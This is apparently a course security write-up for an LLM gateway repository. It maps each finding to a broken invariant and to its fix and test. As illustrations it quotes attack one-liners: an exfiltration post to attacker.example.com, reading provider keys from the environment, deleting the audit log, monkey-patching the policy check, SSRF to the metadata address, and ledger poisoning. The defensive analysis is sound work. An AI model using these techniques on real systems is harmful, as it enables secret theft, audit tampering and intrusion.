# Session 12 Part 1 — Findings, Invariants, and Fixes

Each catalogued finding from Session 12 (Section 6 groups A/C, Section 7's ten
leaks), the Section 4 invariant it breaks, the attacker role that reaches it,
and how it is fixed in this repository.

## The eight invariants (Section 4)

1. Adapters must never see provider API keys.
2. Every action must be checked against the actual user, tenant, and final arguments.
3. External content must always be treated as data, never as instructions.
4. A credential must work only for one specific tool call.
5. Each tenant must have separate memory, and every stored fact must record its source.
6. Dangerous or high-impact actions must be approved with their final parameters.
7. Components must not be able to edit or delete their own audit logs.
8. Every run must have hard limits on time, tokens, tool calls, and cost.

## The hardening moves

The findings cluster into a handful of moves, all implemented here:

- **Provider-key isolation** — the gateway holds no provider keys; each key
  lives in its own worker (subprocess locally, per-provider Modal Function in
  prod) with its own Secret and its own egress allowlist.
  (`glc/provider_worker.py`, `glc/provider_broker.py`, `infra/modal_workers.py`)
- **Auth in front of the data plane** — a gateway API key gate + docs disabled.
  (`glc/security/auth.py`, `glc/main.py`)
- **Egress control** — SSRF-safe fetch + per-host allowlist.
  (`glc/security/egress.py`)
- **Tamper-evident audit** — SHA-256 hash chain over the audit log.
  (`glc/audit/store.py`)
- **Hard limits** — data-plane rate limit + daily budget; cost-ledger
  validation; pairing brute-force throttle.
  (`glc/security/budget.py`, `glc/db.py`, `glc/security/pairing.py`)
- **Reproducible, minimal deploy** — image built from `uv.lock`, single audit
  writer, per-component images. (`infra/modal_app.py`, `infra/modal_workers.py`)

---

## Section 6 — Group A (introduced or elevated by the migration)

### A1 — Public data plane, no auth
- **Invariant:** 2 (and feeds 8). **Attacker:** anyone with the URL (external).
- **Was:** `POST /v1/chat`, `/chat/batch`, `/embed`, `/vision`, `/speak`,
  `/transcribe` ran for anyone; unauth `/v1/chat` returned a 502 provider
  error, not 401.
- **Fix:** `glc/security/auth.py` `require_api_key` is a dependency on every
  data-plane router (`glc/main.py`). Bearer `GLC_GATEWAY_API_KEY`, constant-time
  compare, **fails closed** (503) if no key is configured. `/healthz` stays open.
- **Verified live:** unauth `/v1/chat` → **401** (was 502); with key → 502
  (clears the gate and reaches the provider layer).

### A2 — Unauthenticated info disclosure + Swagger
- **Invariant:** 2. **Attacker:** external.
- **Was:** `/v1/status`, `/providers`, `/capabilities`, `/cost/by_agent`,
  `/calls`, plus `/docs` and `/openapi.json` all open.
- **Fix:** the read-only surfaces sit behind the same data-plane auth gate;
  `/docs`, `/redoc`, `/openapi.json` disabled unless `GLC_ENABLE_DOCS=1`
  (`glc/main.py`).
- **Verified live:** `/v1/providers` → **401**; `/openapi.json` and `/docs` →
  **404**.

### A3 — Single Function = no egress wall  (= leak 6)
- **Invariant:** 1, 3. **Attacker:** in-process / compromised adapter.
- **Fix:** each provider worker Function has its own `outbound` allowlist
  (`infra/modal_workers.py`, `GLC_EGRESS_ALLOWLIST` per worker); the
  application-layer companion `glc/security/egress.py` blocks off-allowlist and
  private/link-local targets. See leak 6.

### A4 — One Secret for the whole Function  (= leak 1)
- **Invariant:** 1. **Attacker:** in-process / compromised adapter.
- **Fix:** the flagship split — see leak 1. The gateway runs with
  `GLC_ISOLATED_PROVIDERS=1` and reads no provider key; each key is a separate
  per-provider Secret mounted only into that provider's worker.

### A5 — Non-reproducible image
- **Invariant:** supply-chain (Section 9). **Attacker:** supply chain.
- **Was:** shipped `modal_app.py` built on rolling `debian_slim` with `>=` dep
  ranges, ignoring `uv.lock`.
- **Fix:** `infra/modal_app.py` installs from the frozen `uv.lock`
  (`uv export --frozen ... | uv pip install`) and pins the base image; provider
  workers use a minimal pinned image (`infra/modal_workers.py`).

### A6 — Audit DB on a Volume with autoscale
- **Invariant:** 7. **Attacker:** concurrency (not an actor).
- **Was:** `min_containers=0` + autoscale → multiple containers → concurrent
  SQLite writers → corrupted/split audit trail.
- **Fix:** `infra/modal_app.py` sets `max_containers=1` so there is exactly one
  audit writer; the audit store commits each append (`isolation_level=None`).
  Combined with the hash chain (leak 2), a single ordered chain is maintained.

## Section 6 — Group C (inherited endpoint/logic issues, now internet-reachable)

### C1 — SSRF via `/v1/vision`
- **Invariant:** 2 (confused deputy). **Attacker:** external (once past auth) /
  message author.
- **Was:** `_resolve_image_urls` fetched any http(s) URL with
  `follow_redirects=True` and no allowlist.
- **Fix:** `glc/security/egress.safe_get` follows redirects manually and
  re-validates every hop against the private/loopback/link-local/reserved
  denylist (IPv4, IPv6, IPv4-mapped IPv6); the vision resolver uses it
  (`glc/routes/chat.py`).
- **Verified live:** vision at `169.254.169.254` and at `127.0.0.1` → **400
  rejected**.

### C2 — Cross-channel envelope spoofing  (= leak 9)
- See leak 9.

### C3 — WS token in query string
- **Invariant:** 4. **Attacker:** anyone who can read access logs / proxy history.
- **Was:** `WS /v1/channels/{name}?token=...` accepted the install token in the
  query string, which lands in logs.
- **Fix:** header-only (`Authorization: Bearer`), constant-time compare; the
  `?token=` path removed (`glc/routes/channels.py`).
- **Verified:** `test_channel_ws_security.py::test_ws_rejects_query_string_token`.

### C4 — Verbose upstream errors
- **Invariant:** — (information disclosure). **Attacker:** external.
- **Was:** `/v1/chat` returned the raw provider error and endpoint.
- **Fix:** client sees a generic message; provider/endpoint/raw error stay in
  the server-side `db.log_call` ledger (`glc/routes/chat.py`).
- **Verified live:** `/v1/chat` on a mock key → `{"detail":"upstream provider
  error; see gateway logs for detail"}`.

### C5 — No rate limits or budget on the public data plane
- **Invariant:** 8. **Attacker:** external (DoS / denial-of-wallet).
- **Fix:** `glc/security/budget.py` adds a per-caller sliding-60s rate limit
  (`GLC_DATAPLANE_RPM`, default 60) and a hard daily request budget
  (`GLC_DATAPLANE_DAILY_BUDGET`, default 5000), wired as a data-plane
  dependency (`glc/main.py`).
- **Verified:** `test_dataplane_budget.py`.

### C6 — Pairing-code brute force
- **Invariant:** 2. **Attacker:** anyone who can reach the confirm path.
- **Fix:** `PairingStore.confirm_code` throttles failed attempts (5 per 5-min
  window, then lockout); the control route returns 429 when throttled
  (`glc/security/pairing.py`, `glc/routes/control.py`).
- **Verified:** `test_pairing_bruteforce.py`.

---

## Section 7 — the ten code leaks

### Leak 1 — Shared process environment (all provider keys readable in-process)
- **Invariant:** 1. **Attacker:** any in-process code / compromised adapter.
- **Was:** every adapter runs in the gateway process, so
  `os.environ["GEMINI_API_KEY"]` (and every other key) is readable.
- **Fix (structural):** the gateway holds **no** provider keys. In isolated
  mode (`GLC_ISOLATED_PROVIDERS=1`) it builds keyless `RemoteProvider` objects
  (`glc/provider_broker.py`) that dispatch each call to an isolated worker
  (`glc/provider_worker.py`) holding exactly one provider's key —
  a subprocess locally, a per-provider Modal Function with its own Secret in
  prod (`infra/modal_workers.py`). The key is never in the gateway's memory.
- **Verified live:** the gateway process environment contains no
  `GEMINI_API_KEY`; a `/v1/chat` dispatches to the worker, which reaches Google
  with its own key (real "API key not valid" on the mock key); a worker with no
  key fails with "not present". `test_provider_isolation.py`.

### Leak 2 — Audit database writable at the OS layer
- **Invariant:** 7. **Attacker:** any in-process code.
- **Was:** `sqlite3.connect(...).execute("DELETE FROM audit_log")` silently
  erases history; the "append-only" property was app-layer only.
- **Fix:** the audit log is now a SHA-256 **hash chain** (`prev_hash`,
  `row_hash`; schema v2). Any DELETE/UPDATE/splice breaks the chain, and
  `verify_chain()` reports the first broken row; exposed at
  `GET /v1/control/audit/verify` (install-token gated). The single-writer
  gateway (A6) keeps read-then-write atomic. (A full wipe is detectable only
  against an external checkpoint; partial tampering is always caught.)
- **Verified:** `test_audit_chain.py` (delete and edit both detected).

### Leak 3 — Pairing DB + in-process `force_pair_owner()`
- **Invariant:** 2. **Attacker:** any in-process code.
- **Was:** one line grants the caller `owner_paired` trust.
- **Fix (structural + guard):** the structural close is component separation
  (this method belongs to the installer). The concrete guard:
  `force_pair_owner()` refuses to run unless `GLC_ALLOW_FORCE_PAIR=1`, which the
  one-shot installer sets and the serving gateway never does
  (`glc/security/pairing.py`).
- **Verified:** `test_force_pair_guard.py`.

### Leak 4 — Install token readable in-process
- **Invariant:** 2, 4. **Attacker:** any in-process code / co-located container.
- **Was:** `~/.glc/install_token` at mode 0600 keeps out other Unix users but
  not same-user code.
- **Fix (structural + hardening):** structural close is component separation;
  the hardening delivers the token via `GLC_INSTALL_TOKEN` (a Secret mounted
  only into the gateway) and, in that mode, never writes it to the shared
  config Volume (`glc/config.py`).
- **Verified:** `test_install_token_secret.py`.

### Leak 5 — Policy engine open to monkey-patching
- **Invariant:** 6. **Attacker:** any in-process code.
- **Was:** `glc.policy.engine.evaluate = lambda ...` rebinds the policy check.
- **Fix (structural):** the honest fix is running the policy engine in a
  separate process (lecture: "capstone scope"). In-process Python can always
  rebind a module attribute, so an in-process guard would be theater. The
  same isolation pattern used for provider workers is the mechanism; the policy
  engine has no live runtime call site yet (the S11 agent is a stub), so no
  false in-process guard is added. **Documented, structural.**

### Leak 6 — Unbounded network egress
- **Invariant:** 1, 3. **Attacker:** any in-process code / compromised adapter.
- **Was:** `httpx.post("https://attacker.example.com/exfil", ...)` and the bytes
  leave; a single Function has no outbound control.
- **Fix:** per-provider workers run with their own egress allowlist
  (`infra/modal_workers.py`, `GLC_EGRESS_ALLOWLIST` = that provider's host
  only); `glc/security/egress.assert_egress_allowed` is the app-layer companion
  that blocks off-allowlist and private/link-local hosts. (Egress control is
  one necessary layer; data can still leave through an allowed reply, per the
  lecture — that is the surviving chain in Section 12.)
- **Verified:** `test_egress.py`.

### Leak 7 — Unrestricted subprocess and shell access
- **Invariant:** 8 / RCE. **Attacker:** any in-process code.
- **Analysis:** there is **no shell-injection bug in the code** — every
  `subprocess.run` (whisper_cpp wrapper, system-fallback TTS) passes an
  argument **list**, never `shell=True` or `os.system`. The leak is a
  *capability*: any adapter can shell out and the monolithic image ships a
  shell.
- **Fix (structural):** per-component minimal images + Sandbox isolation
  (non-root, read-only FS, syscall filter, egress limits). The provider-worker
  split establishes this; the whisper worker follows the same pattern. No
  fabricated code guard, because there is no code bug to patch. **Documented,
  structural.**

### Leak 8 — Adapter kills the gateway directly
- **Invariant:** 8. **Attacker:** any in-process code.
- **Analysis:** `os.kill(os.getpid(), SIGTERM)` ends the process; the **remote**
  kill endpoint is already loopback-gated (`glc/routes/control.py`), so the
  internet path is closed. The in-process path is only closed by putting
  adapters in a separate PID namespace so they cannot see the gateway's PID.
- **Fix (structural):** component/PID-namespace separation (the container
  split). No in-process guard can stop code in the same process from signalling
  it. **Documented, structural.**

### Leak 9 — Cross-channel envelope spoofing
- **Invariant:** 2. **Attacker:** a compromised/malicious channel adapter.
- **Was:** `WS /v1/channels/{name}` never checked `env.channel == name`, so a
  Telegram adapter could send `env.channel="discord"` and impersonate Discord.
- **Fix:** the WS route rejects any envelope whose `env.channel` differs from
  the route name, records a `channel_spoof_rejected` audit event, and closes the
  socket (`glc/routes/channels.py`).
- **Verified:** `test_channel_ws_security.py::test_ws_rejects_channel_mismatch`.

### Leak 10 — Cost-ledger poisoning
- **Invariant:** 7, 8. **Attacker:** any in-process code.
- **Was:** `glc.db.log_call(... input_tokens=999_999_999 ...)` validated
  nothing, corrupting cost/budget accounting.
- **Fix:** `log_call` rejects non-int, negative, and absurd (>10M) token counts
  (`LedgerValidationError`) before writing (`glc/db.py`). (Raw SQLite access is
  closed by the same process separation as leak 2.)
- **Verified:** `test_cost_ledger.py`.

---

## What is structural vs. patched

Leaks 3, 4, 5, 7, 8 exist **because adapters share the gateway's process** —
the lecture is explicit that their real fix is process/container separation, not
an in-process guard. This repo builds that separation as a working, deployable,
tested topology on both boundaries:

- **Provider boundary (invariant 1):** each provider key runs in its own worker
  with its own Secret + egress allowlist. `glc/provider_worker.py`,
  `glc/provider_broker.py`, `infra/modal_workers.py`.
- **Adapter boundary (weak-isolation):** each contributed adapter runs in its
  own container, holding only its own channel secret, with its own egress
  allowlist — so a malicious/buggy adapter can no longer read a sibling's token,
  the gateway's files, or signal the gateway's PID. Built as a worked example
  for **Gmail** (`glc/adapter_worker.py`, `glc/adapter_broker.py`,
  `infra/modal_adapters.py`); the remaining adapters follow the identical
  template. In isolated mode (`GLC_ISOLATED_ADAPTERS=1`) the gateway imports and
  runs no adapter code (verified by test).

Plus honest defense-in-depth for leaks 3 and 4 (bootstrap-only `force_pair_owner`,
install token via Secret). For leaks 5, 7, 8 no in-process code guard would be
truthful (Python can rebind modules, signal its own PID, and spawn subprocesses
from within one process), so they are closed by the container-separation pattern
above and documented here rather than papered over with theater.

### Adapter isolation, proven

`adapter_gmail` on Modal ran the real Gmail adapter code inside its own
container (reached `_get_client()` / `token.json` on mock creds) while the
gateway held no Gmail secret. A unit test asserts the Gmail adapter module is
NOT imported into the gateway process in isolated mode, and that the
per-adapter secret reader never returns a sibling adapter's token.

## Deploying the hardened topology

```
# per-provider key Secrets (mock values)
modal secret create glc-key-gemini     GEMINI_API_KEY=mock-not-real
modal secret create glc-key-groq        GROQ_API_KEY=mock-not-real
modal secret create glc-key-nvidia      NVIDIA_API_KEY=mock-not-real
modal secret create glc-key-cerebras    CEREBRAS_API_KEY=mock-not-real
modal secret create glc-key-openrouter  OPEN_ROUTER_API_KEY=mock-not-real
modal secret create glc-key-github      GITHUB_ACCESS_TOKEN=mock-not-real
# gateway auth key (no provider keys on the gateway)
modal secret create glc-gateway-auth    GLC_GATEWAY_API_KEY=<long-random>
# per-adapter channel secret (Gmail worked example)
modal secret create glc-adapter-gmail   GMAIL_OAUTH_CLIENT_ID=mock-not-real \
    GMAIL_OAUTH_CLIENT_SECRET=mock-not-real GMAIL_BOT_ADDRESS=bot@example.com

modal deploy infra/modal_workers.py    # per-provider isolated workers
modal deploy infra/modal_adapters.py   # per-adapter isolated Sandboxes (Gmail)
modal deploy infra/modal_app.py        # keyless gateway
```

To run the gateway with isolated adapters, set `GLC_ISOLATED_ADAPTERS=1` and
`GLC_ADAPTER_BACKEND=modal` (or `subprocess` locally with
`GLC_ADAPTER_SECRETS_DIR` pointing at per-adapter secret files).

Local (no Modal) equivalent for verification:

```
GLC_ISOLATED_PROVIDERS=1 GLC_PROVIDER_BACKEND=subprocess \
GLC_PROVIDER_KEYS_DIR=/path/to/keys \
GLC_REQUIRE_AUTH=1 GLC_GATEWAY_API_KEY=... \
uv run uvicorn glc.main:app
```
